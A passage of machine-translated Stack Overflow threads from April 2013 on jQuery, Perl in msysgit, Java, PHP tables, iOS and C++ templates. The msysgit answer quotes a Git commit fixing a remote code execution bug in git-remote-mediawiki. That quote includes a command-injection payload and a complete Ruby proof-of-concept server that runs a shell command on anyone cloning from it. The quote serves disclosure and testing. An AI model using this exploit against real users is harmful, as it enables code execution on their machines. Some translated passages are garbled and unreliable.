 private static final long INITSLOT = 0;

public static void main(String[] args) {

    CE.InitToken(INITSLOT, "pincode".getBytes(), "TEST".getBytes());
    long session = CE.OpenSession(INITSLOT, CKS.RW_PUBLIC_SESSION, null,
            null);
    CE.Login(session, CKU.SO, "pincode".getBytes());
    CE.InitPIN(session, "pincode2".getBytes());
    CE.Logout(session);
    CE.Login(session, CKU.USER, "pincode".getBytes());
    byte[] somenewpin = "somenewpin".getBytes();
    CE.SetPIN(session, "pincode2".getBytes(), somenewpin);
    CE.SetPIN(session, somenewpin, "pincode2".getBytes());

} 
```

# javascript - 使用 jQuery 删除和添加 CSS 类

> ID：15847073
> 
> 赞同：2
> 
> 时间：2013-04-06T04:41:34.323
> 
> 标签：javascript, jquery, css, animation

我有一个区域，我想在单击它时添加一个 CSS 动画，然后在加载时将它与另一个动画一起带回来。

我正在使用 Twitter 的 Bootstrap 选项卡并打开选项卡之间的“淡入淡出”过渡，但希望在它们切换时专门为这些选项卡内的某些内容设置动画。我不想弄乱那里的根 JS 代码，所以我只是解决了一个问题。

这是我的代码：

```
 $(".tabit").click(function (){

        //Drop Center Icon on click
        if ($('.centericon').hasClass('fadeInDown')) {
            $(".centericon").removeClass('fadeInDown').addClass("fadeOutDown").delay(100).queue(function(next){
                $(this).removeClass("fadeOutDown").addClass("fadeInDown");
                });
        }
        else{
            $(".centericon").addClass("fadeOutDown").delay(100).queue(function(next){
                $(this).removeClass("fadeOutDown").addClass("fadeInDown");
                });
        }
    }); 
```

.centericon 类是重复的，所以单击 1 次后，多个实例将具有“fadeInDown”类。当我单击一次时工作正常，但如果我单击两次，则 .centericon 只会获得类 .fadeOutDown。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T17:50:07.723

```
$(".tabit").click(function (){
        //Scroll to top when navigating through tabs

        //Drop Center Icon on click
        if ($('.centericon').hasClass('fadeInDown')) {
            $(".centericon").removeClass('fadeInDown').addClass("fadeOutDown");
            $(".centericon").delay(100).queue(function() {
                $(this).removeClass('fadeOutDown');
                $(this).dequeue();

            });
            $(".centericon").delay(100).removeClass('fadeOutDown').addClass("fadeInDown");
        }
        else{
            $(".centericon").addClass("fadeOutDown");
            $(".centericon").delay(100).queue(function() {
                $(this).removeClass('fadeOutDown').addClass("fadeInDown");
                $(this).dequeue();

            });
        }
    }); 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-04-06T04:47:59.393

更改`click`为`toggle`

```
$(".tabit").toggle(function () {
    $(".centericon").removeClass('fadeInDown').addClass("fadeOutDown").delay(100).queue(function (next) {
        $(this).removeClass("fadeOutDown").addClass("fadeInDown");
    });
}, function () {
    $(".centericon").addClass("fadeOutDown").delay(100).queue(function (next) {
        $(this).removeClass("fadeOutDown").addClass("fadeInDown");
    });
}); 
```

# perl - 在 msysgit 中为 git-remote-mediawiki 使用完整的 perl 库

> ID：15847076
> 
> 赞同：3
> 
> 时间：2013-04-06T04:42:00.327
> 
> 标签：perl, git, mediawiki, msysgit

msysgit 提供最小的 perl 库。

我想从 CPAN 下载一些包，所以我需要使用完整的 perl 库。

怎么做？

更具体地说，我想使用`git-remote-mediawiki`插件。这就是为什么需要完整安装 perl 库的原因。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T10:08:48.220

首先检查（如[本文中](http://perl5maven.com/how-to-change-inc-to-find-perl-modules-in-non-standard-locations)），如果修改`PERL5LIB`环境变量以引用该脚本就足够了（修改[`git-cmd.bat`](https://github.com/msysgit/msysgit/blob/master/git-cmd.bat)）：

```
set PERL5LIB = c:\path\to\git\contrib 
```

* * *

否则，对于*外部*contrib perl 脚本，例如[`git-remote-mediawiki`](https://github.com/git/git/blob/master/contrib/mw-to-git/git-remote-mediawiki.perl)，您可以尝试从 DOS 会话执行它，并安装任何最近的 Perl 发行版。
（如[草莓 Perl](http://strawberryperl.com/)，正如 mob 在评论中推荐的那样）。

我建议使用[`git-cmd.bat`](https://github.com/msysgit/msysgit/blob/master/git-cmd.bat)（正确设置 git`PATH`和`HOME`），首先添加您自己的 perl：

```
@set PATH=%git_install_root%\bin;%git_install_root%\mingw\bin;%git_install_root%\cmd;%PATH%
# let's add our perl:
@set PATH=path/to/yourPerl;%PATH% 
```

* * *

这独立于 msysgit 安装，它依赖于旧的 perl，原因在[FAQ](https://github.com/msysgit/msysgit/wiki/Frequently-Asked-Questions)中有解释。

> 原因是我们需要一个 Perl 的 MSys 版本，因为我们没有设法编译 Subversion 模块（这些模块是用 C 编写的，使用普通 Windows 不提供的 POSIX 功能，因此需要 MSys）。

* * *

这似乎足以启动脚本，但[OP linquize](https://stackoverflow.com/users/1031218/linquize)在[评论](https://stackoverflow.com/questions/15847076/use-full-perl-libraries-in-msysgit/15849576?noredirect=1#comment22581780_15849576)中添加：

> 我最终编写了一个**包装**程序`git-remote-mediawiki.exe`来调用外部`perl`并且需要在写入 git 之前转换`CRLF`为，否则如果收到 git 则会挂起。`LF``stdout``CRLF`

* * *

注意：`git-remote-mediawiki`使用 Git 2.29（2020 年第四季度）更加强大，并对 MediaWiki 远程后端进行了一些现代化和修复。

参见[提交9A86064](https://github.com/git/git/commit/9a8606465e81a04d58c20324c402ba3464bc706a)，[提交878D150](https://github.com/git/git/commit/878d150106b0050253390623a8fd5acf553f4be0)，[提交4842A11](https://github.com/git/git/commit/4842a1179444a44095eb9e2dc55abb2c49059642)，[提交2D6B08A](https://github.com/git/git/commit/2d6b08aff41026019e2051abec05e52785450e83)，[提交F8AB018](https://github.com/git/git/commit/f8ab018dafc2ecbea29397c2112c9e7156d7f080)，[提交1D42B4D](https://github.com/git/git/commit/1d42b4d01c95cae37e9c0ebe0ed7c9418f2d6c25)，[提交2388541](https://github.com/git/git/commit/2388541a77540b8e2acfcf77904515ebb65ffcc5)，提交4F80BC9 ，[COMMIT](https://github.com/git/git/commit/e35973b2c93ce085ea491320d74a5a09bff18a47) DDE666EB ，[提交](https://github.com/git/git/commit/5e87dceae013d8752c0fda0c5a3e90d631109de9)9FF2958 ，[提交](https://github.com/git/git/commit/090850e1b03fb16fcfcd929098c6834db389faa5)[730ECC1](https://github.com/git/git/commit/730ecc10c7069b1968e4c90b9450013546a510b3)，[commit](https://github.com/git/git/commit/dde66eb6f1d29c6b5729b41904eaef69234be07c) [730ECC1](https://github.com/git/git/commit/4f80bc9bc2706b9ef467fab3c53b6815f37b2854)，[commit](https://github.com/git/git/commit/9ff2958dd8376869e1de9a34fdaf74121481bb3f) [09909.90909.9090850](https://github.com/git/git/commit/128efae6dc2f8613a593f55ea326afb5d003ff17)，，并[提交 872977b](https://github.com/git/git/commit/872977b10d503d54e8496df398361167b1824bf0)，[提交 442f5aa](https://github.com/git/git/commit/442f5aacccc64ad1a4a05a7d2f97042a2ad206d3)（2020 年 9 月 16 日），作者： [Ævar Arnfjörð Bjarmason (](https://github.com/avar) [)](https://github.com/avar)。 看[`avar`](https://github.com/avar)
[Simon Legner ( )`simon04`](https://github.com/simon04)[提交 96653ce](https://github.com/git/git/commit/96653ce3041e87f71a8dbbcfd4cb80424758c8fd)（2020 年 9 月 21 日[）](https://github.com/simon04)。
^(（由[Junio C Hamano 合并 -- `gitster`--](https://github.com/gitster)在[提交 5a25615](https://github.com/git/git/commit/5a25615d5c026580b3e5645b53f8397bd8c3e76d)中，2020 年 10 月 4 日）)

例如：

> ## [`remote-mediawiki`](https://github.com/git/git/commit/4842a1179444a44095eb9e2dc55abb2c49059642): 转换为引用的`run_git()`调用
> 
> ^(报告人：Joern Schneeweisz)
> ^(签字人：Ævar Arnfjörð Bjarmason)

> 更改那些能够`run_safe()`使用带引号的参数列表调用的调用站点。
> 
> 这修复了Joern Schneeweisz 向 git-security 邮件列表报告的传输助手中的[RCE（远程代码执行）错误。](https://en.wikipedia.org/wiki/Arbitrary_code_execution)
> 由于 remote-mediawiki 代码的相对晦涩难懂，该问题正在公开。
> 
> 安全问题是我们将通过 Perl 的 " `open -|`" 执行这样的命令，其中`$name`直接从`api.php`响应中获取。因此，例如 JSON 响应：
> 
> ```
> [...]"title":"`id>/tmp/mw`:Main Page"[..] 
> ```
> 
> 将导致调用：
> 
> ```
> git config --add remote.origin.namespaceCache "`id>/tmp/mw`:notANameSpace" 
> ```
> 
> > 从这样的代码中，这个补丁正在改变：
> 
> ```
> run_git(qq(config --add remote.${remotename}.namespaceCache "${name}:${store_id}")); 
> ```
> 
> 所以我们会执行一个任意命令，并将“ `remote.origin.namespaceCache=:notANameSpace`”放在配置中。
> 有了这个更改，我们引用了所有这些，所以现在我们只需将“ `remote.origin.namespaceCache=``id>/tmp/x``:notANameSpace`”写入配置，而不执行任何远程命令。
> 
> 关于实现：如[“将文件句柄打开到命令中”](https://perldoc.perl.org/functions/open.html#Opening-a-filehandle-into-a-command)（另见“[安全管道打开](https://perldoc.perl.org/perlipc#Safe-Pipe-Opens)”）中所述，这种调用`open()`方式在 Windows 上直到 Perl 5.22 都存在兼容性问题。
> 然而，Johannes Schindelin 指出，在这种情况下我们不应该担心 Windows，因为（引用他的私人电子邮件）：
> 
> 1.  mediawiki 助手从未作为官方 Git for Windows 版本的一部分发布。它也从未成为官方 MSYS2 软件包的一部分。这意味着想要使用 mediawiki 帮助程序的 Windows 用户必须自己构建 Git，而似乎没有多少用户这样做。
>     
>     
> 2.  与 Perl v5.22.x 一起发布的最后一个 Git for Windows 版本是 Git for Windows v2.11.1；自 Git for Windows v2.12.0（2017 年 2 月 25 日发布）以来，仅包含更新的 Perl 版本。
>     
>     
> 
> 所以让我们使用这个`open()`API。
> 到处搜索表明我们发布的各种其他 Perl 代码，例如 gitweb 等。使用这种调用方式`open()`，所以我们不应该有任何兼容性问题。
> 
> 为了进一步的参考和未来的测试，这里是 Joern 提供的有效利用代码：
> 
> ```
> #!/usr/bin/ruby
> # git client side RCE via `mediawiki` remote proof of concept
> # Joern Schneeweisz - GitLab Security Research Team  
> 
> require 'sinatra'
> set bind: '0.0.0.0'  
> 
> if not ARGV[0]  
> 
> puts "Please provide the shell command to be execucted."
> exit -1  
> 
> end  
> 
> cmd = ARGV[0]
> all_pages = sprintf('{"limits":{"allpages":500},"query":{"allpages":[{"pageid":1,"ns":3,"title":"`%s`:Main Page"}]}}', cmd)
> revs = sprintf('{"query":{"pages":{"1":{"pageid":1,"ns":3,"title":"`%s`:Main Page","revisions":[{"revid":1,"parentid":0,"user":"MediaWiki default","timestamp":"2020-09-04T20:25:08Z","contentformat":"text/x-wiki","contentmodel":"wikitext","comment":"","*":"<al:MyLanguage/Help:Contents]"}]}}}}', cmd)
> mainpage= sprintf('{"batchcomplete":"","query":{"pages":{"1":{"pageid":1,"ns":3,"title":"`%s`:Main Page","revisions":[{"revid":1,"parentid":0}]}}}}',cmd)  
> 
> post '/api.php' do  
> 
> if params[:list] == 'allpages'
>   return all_pages
> end  
> 
> if params[:prop] == 'revisions'
>   return revs
> end  
> 
> return mainpage
> end 
> ```
> 
> 哪一个：
> 
> `[...]`应该像这样运行：`ruby wiki.rb 'id>/tmp/mw'`.
> 现在，当被克隆时，将在克隆过程中创建`git clone mediawiki::http://localhost:4567`文件`/tmp/mw`，其中包含`id`.

# java - ArrayList 未在 java 中正确初始化

> ID：15847078
> 
> 赞同：-3
> 
> 时间：2013-04-06T04:42:11.627
> 
> 标签：java, arraylist

我`ArrayList`在我的应用程序中使用。
我`List<Product> productList = new ArrayList<Product>();`在全球范围内声明，但产品未添加到此列表中，因为`productList`显示为`null`而不是空数组列表。

下面是我的代码：

```
Map<String, List<Product>> productListMap = productSuggestBox.getValueMap();

List<Product> queriedProductList = productListMap.get("productList");

long productId = Long.valueOf(productSuggestBoxValue);

for (Product product : queriedProductList) {
    if (product.getId() == productId) {
        productList.add(product);
        break;
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T06:30:26.353

这是尝试从您提供的片段中拼凑代码结构的尝试：

```
public class SalesInvoiceWidget extends Composite { 
    List<Product> productList = new ArrayList<Product>();

    // ...

    private void someMethod() {
        Map<String, List<Product>> productListMap = 
                productSuggestBox.getValueMap();

        List<Product> queriedProductList = productListMap.get("productList");

        long productId = Long.valueOf(productSuggestBoxValue);

        for (Product product : queriedProductList) {
            if (product.getId() == productId) {
                productList.add(product);
                break;
            }
        } 
```

假设上面的重建是完全正确的，那么唯一的方法`productList`是`null`在你的代码中的某个地方（上面没有显示！），你*分配* `null`给`productList`.

`productList`另一种可能的解释是，在您看到`null`;时，范围内有一个不同的声明。例如，它可能是一个局部变量或一个命名`productList`为*遮蔽*“全局”声明的方法参数。

* * *

请注意，如果 Java 中的变量以前非空，则它*不会*神奇地变为。`null`分配给它的东西，或者它是一个不同的变量。没有其他合理的解释……假设您使用的是纯 Java。

# html - 使用 CSS 在六边形图像中插入矩形图像

> ID：15847087
> 
> 赞同：0
> 
> 时间：2013-04-06T04:44:46.167
> 
> 标签：html, css

我有一个六边形的图像，以及另一个矩形形状的图像。我想将矩形图像放在六边形图像中。我知道这可以使用 CSS 完成，但我的六边形形状很特殊。我尝试过创建多个相互嵌入的 div，并将位置设置为相对和绝对，恭敬地，但它不起作用。基本上，如何在另一个形状奇特的图像中插入一个奇形怪状的图像？这似乎是一个简单的解决方案，但我无法弄清楚！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T05:47:17.027

我会尝试的第一件事是将六边形图像放在父 div 中，将其位置设置为相对或绝对，然后将方形图像放在嵌套在六边形图像 div 中的 div 中。然后将其绝对定位到您想要的位置。

这应该可行，但听起来你已经尝试过了。它在做什么？

# php - 使用 HTML 表格的 PHP 循环

> ID：15847093
> 
> 赞同：2
> 
> 时间：2013-04-06T04:45:31.743
> 
> 标签：php, html, mysql

晚上所有，

我使用的代码如下：

```
<?php
/**
 * The template for displaying all pages.
 * Template Name: addserverindexoci
 * This is the template that displays all pages by default.
 * Please note that this is the WordPress construct of pages
 * and that other 'pages' on your WordPress site will use a
 * different template.
 *
 * @package WordPress
 * @subpackage Twenty_Twelve
 * @since Twenty Twelve 1.0
 */

get_header(); ?>

<div id="primary" class="site-content">
    <div id="content" role="main">

        <?php while ( have_posts() ) : the_post(); ?>
            <?php get_template_part( 'content', 'page' ); ?>
            <?php comments_template( '', true ); ?>

        <?php endwhile; // end of the loop. ?>

<table border="2" bordercolor="#000000" style="background-color:#FFFFFF" width="160%" cellpadding="1" cellspacing="0">  
    <td><font face="Arial, Helvetica, sans-serif">Server Name</font</td>
    <td><font face="Arial, Helvetica, sans-serif">Server Address</font</td>
    <td><font face="Arial, Helvetica, sans-serif">Server Port</font</td>
    <td><font face="Arial, Helvetica, sans-serif">Server Description</font</td>
    <td><font face="Arial, Helvetica, sans-serif"> Status</font</td>

<?php

mysql_connect("localhost", "", "") or die (mysql_error());
#echo "Connected to MYSQL ";
mysql_select_db("starforg_search") or die (mysql_error());
#echo "Connected to Data Base";
$query = "SELECT * FROM ";
$result = mysql_query ($query) or die (mysql_error());

$num=mysql_numrows($result);

mysql_close();

$i=0;
while ($i < $num) {

        $value = mysql_result($result,$i,"servername");
        $value2 = mysql_result($result,$i,"serveraddress");
        $value3 = mysql_result($result,$i,"portnumber");
        $value4 = mysql_result($result,$i,"description");

ob_start();

if (!$socket = @fsockopen($value2, $value3, $errno, $errstr, 1))
{
  echo "&nbsp;<font color='red'><CENTRE><strong> Server Is Offline!</strong></CENTRE></font>";
}
else 
{
 echo "&nbsp;<font color='green'><CENTRE><strong> Server Is Online!</strong></CENTRE></font>";  

  fclose($socket);
}
$status = ob_get_contents();
ob_end_clean();
?>

<tr>
    <td><font face="Arial, Helvetica, sans-serif"><? echo $value; ?></font</td>
    <td><font face="Arial, Helvetica, sans-serif"><? echo $value2; ?></font</td>
    <td><font face="Arial, Helvetica, sans-serif"><? echo $value3; ?></font</td>
    <td><font face="Arial, Helvetica, sans-serif"><? echo $value4; ?></font</td>
    <td><font face="Arial, Helvetica, sans-serif"><? echo $status; ?></font</td>

<?
$i++;

}

?>  

</div><!-- #primary -->

<?php get_footer(); ?> 
```

**我** 现在想要什么正如您从 while 循环中看到的那样，我正在尝试显示选定字段内的所有数据。

**发生了什么** 我想继续循环，直到所有数据都显示出来这是可行的，但是数据转到我假设的页面底部，因为我没有使用 html 的结束标记，例如 < /tr>。问题是如果我为表格输入结束标签，它只会循环一次并在字段中显示 for 数据集，其余数据将不是表格格式。

**问题** 如何让循环继续显示字段中的所有数据，并显示页脚干净整洁，

注意：对不起，如果这有点粗糙，我今天病了 :(

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T05:03:25.563

**这有什么问题？**

```
<table border="2" bordercolor="#000000" style="background-color:#FFFFFF" width="160%" cellpadding="1" cellspacing="0">  
<tr>
    <td><font face="Arial, Helvetica, sans-serif">Server Name</font</td>
    <td><font face="Arial, Helvetica, sans-serif">Server Address</font</td>
    <td><font face="Arial, Helvetica, sans-serif">Server Port</font</td>
    <td><font face="Arial, Helvetica, sans-serif">Server Description</font</td>
    <td><font face="Arial, Helvetica, sans-serif"> Status</font</td>
</tr>
<?php

mysql_connect("localhost", "", "") or die (mysql_error());
#echo "Connected to MYSQL ";
mysql_select_db("starforg_search") or die (mysql_error());
#echo "Connected to Data Base";
$query = "SELECT * FROM tablename";
$result = mysql_query ($query) or die (mysql_error());

$num=mysql_numrows($result);

mysql_close();

$i=0;
while ($i < $num) {

        $value = mysql_result($result,$i,"servername");
        $value2 = mysql_result($result,$i,"serveraddress");
        $value3 = mysql_result($result,$i,"portnumber");
        $value4 = mysql_result($result,$i,"description");

ob_start();

if (!$socket = @fsockopen($value2, $value3, $errno, $errstr, 1))
{
  echo "&nbsp;<font color='red'><CENTRE><strong> Server Is Offline!</strong></CENTRE></font>";
}
else 
{
 echo "&nbsp;<font color='green'><CENTRE><strong> Server Is Online!</strong></CENTRE></font>";  

  fclose($socket);
}
$status = ob_get_contents();
ob_end_clean();
?>

<tr>
    <td><font face="Arial, Helvetica, sans-serif"><? echo $value; ?></font</td>
    <td><font face="Arial, Helvetica, sans-serif"><? echo $value2; ?></font</td>
    <td><font face="Arial, Helvetica, sans-serif"><? echo $value3; ?></font</td>
    <td><font face="Arial, Helvetica, sans-serif"><? echo $value4; ?></font</td>
    <td><font face="Arial, Helvetica, sans-serif"><? echo $status; ?></font</td>
</tr>

<?
$i++;

}

?>  
</table> 
```

而且我在您的查询中找不到**表名**`$query = "SELECT * FROM ";`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T05:06:12.240

```
<?php while($row=mysql_fetch_array($result)){ ?>
<tr>
    <td><font face="Arial, Helvetica, sans-serif"><? echo $row['servername']; ?></font</td>
     . 
     .
</tr>

<? } ?> 
```

你也可以这样使用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T05:15:29.410

```
$query = "SELECT * FROM your table name";
$result = mysql_query ($query) or die (mysql_error());

$num=mysql_numrows($result);
while($row = mysql_fetch_array($result))
{
  ob_start();

if (!$socket = @fsockopen( $row['serveraddress'], $row['portnumber'], $errno, $errstr, 1))
{
  echo "&nbsp;<font color='red'><CENTRE><strong> Server Is Offline!</strong></CENTRE></font>";
}
else 
{
 echo "&nbsp;<font color='green'><CENTRE><strong> Server Is Online!</strong></CENTRE></font>";  

  fclose($socket);
}
$status = ob_get_contents();
ob_end_clean();?>
       <tr>
    <td><font face="Arial, Helvetica, sans-serif"><? echo $row['servername']; ?></font</td>
    <td><font face="Arial, Helvetica, sans-serif"><? echo $row['serveraddress']; ?></font</td>
    <td><font face="Arial, Helvetica, sans-serif"><? echo $row['portnumber']; ?></font</td>
    <td><font face="Arial, Helvetica, sans-serif"><? echo $row['description']; ?></font</td>
    <td><font face="Arial, Helvetica, sans-serif"><? echo $status; ?></font</td>
<?php
 }

mysql_close();

?> 
```

试试这个

# ios - 使用 IBAction 中的 if 语句更改 UITextView

> ID：15847094
> 
> 赞同：0
> 
> 时间：2013-04-06T04:45:49.730
> 
> 标签：ios, uitextview, uitextviewdelegate

我一直在寻找很多，但似乎我无法弄清楚。我对 iOS 开发还很陌生，如果我做错了事，我深表歉意。

这是情况。

我正在尝试通过按钮切换 DetailViewController 的内容视图，该按钮应将您发送到下一个文本视图或相同的视图但具有不同的文本。

这是我的头文件。

```
#import <UIKit/UIKit.h>

@interface DetailViewController : UIViewController
@property (strong, nonatomic) IBOutlet UITextView *rowContent;
@property int rowNumber;
@property (strong, nonatomic) NSString * rowName;
@property (strong, nonatomic) IBOutlet UIBarButtonItem *rightArrow;

@end 
```

我的 tableViewController 根据我选择的单元格将我重定向到我的 DetailViewContoller。现在在我的 DetailViewController 中，我有另一个按钮，我想切换到下一个文本，而不是回到 tableViewController 并选择不同的单元格。

```
 //DetailViewController
//set the title of the view
self.title = rowName;

//set the UITextView basec on rowNumber
switch (rowNumber) {
    case 0:
        rowContent.text = [NSString stringWithContentsOfFile:[[NSBundle mainBundle]pathForResource:@"file" ofType:@"txt"] encoding:NSUTF8StringEncoding error:nil];
        break;
    case 1:
        rowContent.text = [NSString stringWithContentsOfFile:[[NSBundle mainBundle]pathForResource:@"file1" ofType:@"txt"] encoding:NSUTF8StringEncoding error:nil];
        break;
    case 2:
        rowContent.text = [NSString stringWithContentsOfFile:[[NSBundle mainBundle]pathForResource:@"file2" ofType:@"txt"] encoding:NSUTF8StringEncoding error:nil];
        break;
    case 3:
        rowContent.text = [NSString stringWithContentsOfFile:[[NSBundle mainBundle]pathForResource:@"file3" ofType:@"txt"] encoding:NSUTF8StringEncoding error:nil];
        break;
    default:
        break;

//TableViewController
 -(void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{
//create and instance of our DetailViewController
DetailViewController * DVC = [[DetailViewController alloc]init];
//set the DVC to the destinationViewContoller
DVC = [segue destinationViewController];
//get the indexPath
NSIndexPath * path = [self.tableView indexPathForSelectedRow];

NSString * theList = [rowList objectAtIndex:path.row];
DVC.rowNumber = path.row;
DVC.rowName = theList;

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-07T01:55:42.050

如果我正确理解了这个问题，听起来您正在尝试做一些类似于我最近在应用程序中所做的事情。也就是说，您在导航控制器中有一个表格视图，当您选择一个单元格时，它会转到详细视图，然后您希望能够在不同的详细视图之间导航，而无需返回表格视图来选择另一个单元格。

我使用 UIPageViewController 做到了这一点。实现起来有点复杂，但是使用起来很干净。它的工作方式是当您点击一个单元格时，它会转到一个包含 UIPageViewController 的视图，然后根据点击的单元格加载适当的“页面”。UIPageViewController 处理页面之间的来回移动。您提供一个模型控制器作为 UIPageViewController 的数据源。它的作用是返回给定索引（页码）的详细视图控制器。要让 UIPageViewController 为每个页面加载适当的数据，您需要向它提供您用来填充表格视图的相同数据。

假设您的表格中有三个单元格。点击中间的，它会使用 UIPageViewController 加载视图。当单元格被点击并且你正在转换到详细视图时，你告诉它哪个单元格被点击了。UIPageViewController 然后使用这个信息来加载正确的细节视图。当用户想要在页面之间导航时，UIPageViewController 只需加载下一页或上一页的数据，其中包含对应于表格视图中该单元格的数据。

请注意，UIPageViewController 不知道也不关心表格视图，它只是使用表格视图用来加载其数据的相同源数据（例如数组）。

文档[在这里](http://developer.apple.com/library/ios/#documentation/WindowsViews/Conceptual/ViewControllerCatalog/Chapters/PageViewControllers.html#//apple_ref/doc/uid/TP40011313-CH4-SW3)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T05:09:40.587

你的问题有点令人困惑。如果要切换到下一个案例，从一个按钮，只需写rowNumber ++；在您的按钮方法中，然后调用您的 switch 语句所在的方法。

# c++ - C++ 模板故障排除简介

> ID：15847096
> 
> 赞同：2
> 
> 时间：2013-04-06T04:46:06.477
> 
> 标签：c++, class, templates

本周我们开始在我们的 CSS 课程中使用模板，它们看起来相当简单，但是，当我们开始在实验室中深入研究它时，一些我们无法弄清楚的问题开始出现。

我们收到以下错误：

```
../Lab7PartC/DLNode.cpp:13:5: error: invalid use of template-name ‘lab7::DLNode’ without an argument list
../Lab7PartC/DLNode.cpp:20:5: error: invalid use of template-name ‘lab7::DLNode’ without an argument list
../Lab7PartC/DLNode.cpp:26:5: error: expected unqualified-id before ‘template’
../Lab7PartC/DLNode.cpp:33:5: error: invalid use of template-name ‘lab7::DLNode’ without an argument list 
```

这是相关的类 .cpp 文件：

```
/*
 * DLNode.cpp
 *
 *  Created on: Mar 29, 2013
 *      Author: tony
 */

#include <cstddef>
#include "DLNode.h"

namespace lab7 {

    DLNode::DLNode() {
        data = 0;
        next = NULL;
        prev = NULL;
    }

    template<class T>
    DLNode::DLNode(T d) {
        data = d;
        next = NULL;
        prev = NULL;
    }

    template<class T>
    DLNode::DLNode(T d, DLNode* n, DLNode* p) {
        data = d;
        next = n;
        prev = p;
    }

    DLNode::~DLNode() {
        delete next;
    }

} /* namespace lab7 */ 
```

这是相关的 .h 文件：

```
/*
 * DLNode.h
 *
 *  Created on: Mar 29, 2013
 *      Author: tony
 */

#ifndef DLNODE_H_
#define DLNODE_H_

namespace lab7 {
    template<class T>
    class DLNode {
    public:
        DLNode();
        DLNode(T data_in);
        DLNode(T data_in, DLNode* n, DLNode* p);
        virtual ~DLNode();

        void setNext(DLNode* n) {
            next = n;
        }

        void setPrev(DLNode* p) {
            prev = p;
        }

        int getData() {
            return data;
        }

        DLNode* getNext() {
            return next;
        }

        DLNode* getPrev() {
            return prev;
        }
    private:
        T data;
        DLNode* next;
        DLNode* prev;
    };

} /* namespace lab7 */
#endif /* DLNODE_H_ */ 
```

我们花了一个晚上试图弄清楚，并感谢有关该主题的任何建议。谢谢。

我不想再打扰你，但我修改了头文件以包含你建议的整个定义，这就是我所拥有的，这次我包括使用节点类的附加类：

```
/*
 * DLNode.h
 *
 *  Created on: Mar 29, 2013
 *      Author: tony
 */

#ifndef DLNODE_H_
#define DLNODE_H_

namespace lab7 {

    template<class T>
    class DLNode {
    public:
        DLNode<T>();
        DLNode<T>(T data_in);
        DLNode<T>(T data_in, DLNode* n, DLNode* p);
        ~DLNode<T>();

        void setNext<T>(DLNode* n) {
            next = n;
        }

        void setPrev<T>(DLNode* p) {
            prev = p;
        }

        int getData<T>() {
            return data;
        }

        DLNode* getNext<T>() {
            return next;
        }

        DLNode* getPrev<T>() {
            return prev;
        }
    private:
        T data;
        DLNode* next;
        DLNode* prev;
    };

    template<class T>
    DLNode<T>::DLNode() {
        data = 0;
        next = NULL;
        prev = NULL;
    }

    template<class T>
    DLNode<T>::DLNode(T d) {
        data = d;
        next = NULL;
        prev = NULL;
    }

    template<class T>
    DLNode<T>::DLNode(T d, DLNode* n, DLNode* p) {
        data = d;
        next = n;
        prev = p;
    }

    template<class T>
    DLNode<T>::~DLNode() {
        delete next;
    }
} /* namespace lab7 */
#endif /* DLNODE_H_ */ 
```

--以及附加的列表类头文件：

```
/*
 * DLList.h
 *
 *  Created on: Mar 29, 2013
 *      Author: tony
 */

#ifndef DLLIST_H_
#define DLLIST_H_

namespace lab7 {

    class DLNode<T>;

    template<class T>
    class DLList {
    public:
        DLList();
        virtual ~DLList();
        void insert(T data);
        void print();
        bool search(const T key);
        bool searchandremove(const T key);
        void swap();
        DLNode* findNode(const T key);
    private:
        DLNode* first;
    };

    template<class T>
    DLList<T>::DLList() {
        first = NULL;
    }

    template<class T>
    DLList<T>::~DLList() {
        delete first;
    }

    template<class T>
    void DLList<T>::insert(T data) {
        DLNode<T>* temp = first;
        first = new DLNode(data, first, NULL);
        if (temp == NULL)
            return;
        temp->setPrev(first);
    }

    template<class T>
    void DLList<T>::print() {
        DLNode* temp = first;
        while (temp != NULL) {
            cout << temp->getData() << " ";
            temp = temp->getNext();
        }
        cout << endl;
    }

    template<class T>
    bool DLList<T>::search(const T key) {
        DLNode* temp = new DLNode;
        bool found = false;
        for (temp = first; temp != NULL; temp = temp->getNext()) {
            if (temp->getData() == key)
                found = true;
        }
        return found;
    }

    template<class T>
    bool DLList<T>::searchandremove(const T key) {
        DLNode* prev = new DLNode;
        DLNode* next = new DLNode;
        DLNode* toDelete = new DLNode;
        toDelete = findNode(key);
        if (toDelete != NULL) {
            prev = toDelete->getPrev();
            next = toDelete->getNext();
            toDelete->setNext(NULL);
            toDelete->setPrev(NULL);
            if (toDelete == first) {
                first = next;
                next->setPrev(first);
            } else {

                prev->setNext(next);
                if (next != NULL)
                    next->setPrev(prev);
            }
            delete toDelete;
            return true;
        }
        return false;
    }

    template<class T>
    DLNode* DLList<T>::findNode(const T key) {
        DLNode* temp = new DLNode;
        for (temp = first; temp != NULL; temp = temp->getNext()) {
            if (temp->getData() == key)
                return temp;
        }
        return NULL;
    }

    template<class T>
    void DLList<T>::swap() {
        DLNode* last = new DLNode;
        //navigate to second to last node
        for (last = first; last->getNext() != NULL; last = last->getNext()) {
        }
        last->getPrev()->setNext(first);
        first->setPrev(last->getPrev());
        last->setPrev(NULL);
        last->setNext(first->getNext());
        first->getNext()->setPrev(last);
        first->setNext(NULL);
        first = last;

    }
} /* namespace lab7 */
#endif /* DLLIST_H_ */ 
```

这带来了许多我不明白的错误：

```
In file included from ../Lab7PartC/Lab7B.cpp:13:0:
../Lab7PartC/DLList.h:14:11: error: ‘DLNode’ is not a template
../Lab7PartC/DLList.h:14:18: error: ‘T’ was not declared in this scope
../Lab7PartC/DLList.h: In member function ‘void lab7::DLList<T>::insert(T)’:
../Lab7PartC/DLList.h:43:9: error: ‘lab7::DLNode’ is not a template
../Lab7PartC/DLList.h:47:13: error: invalid use of incomplete type ‘struct lab7::DLNode’
../Lab7PartC/DLList.h:14:11: error: forward declaration of ‘struct lab7::DLNode’
../Lab7PartC/DLList.h: In member function ‘void lab7::DLList<T>::print()’:
../Lab7PartC/DLList.h:54:25: error: invalid use of incomplete type ‘struct lab7::DLNode’
